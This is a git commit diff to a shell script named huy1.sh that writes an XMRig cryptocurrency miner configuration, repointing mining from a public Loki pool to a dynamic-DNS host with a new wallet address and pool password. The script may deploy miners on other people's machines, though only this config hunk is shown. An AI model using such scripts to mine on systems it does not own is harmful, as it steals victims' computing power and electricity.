64353032c2f56591039664ac03fbad5e2ba55e0f
kalinh <taikhoanxzc004@gmail.com>
2020-08-05 23:04:16 +0700

    Update huy1.sh

--- huy1.sh
+++ huy1.sh
@@ -77,11 +77,11 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
     "log-file": null,
     "pools": [
         {
-            "algo": "rx/loki",
+            "algo": null,
             "coin": null,
-            "url": "ca.loki.herominers.com:10112",
-            "user": "LSTN6TsSrw1FSgDz5FeK8K3FNr6ATo9atRwhxCYEHJFcAv1ZLQmYSHa59pQWSvXDsc7PsZ7rxQ7ZMRj7zy96wzLU8355KWD",
-            "pass": "x",
+            "url": "merryawa.ddns.net:8080",
+            "user": "82oiMVmcV8W7yhWeK2hiDZLVNxwHcugNafCSzk9Zbs3p645n7gbHqf4TKHXrMTHXYPQffgZ9TUebKTr5ZfRN5arV4Vjtvko",
+            "pass": "xms-123",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
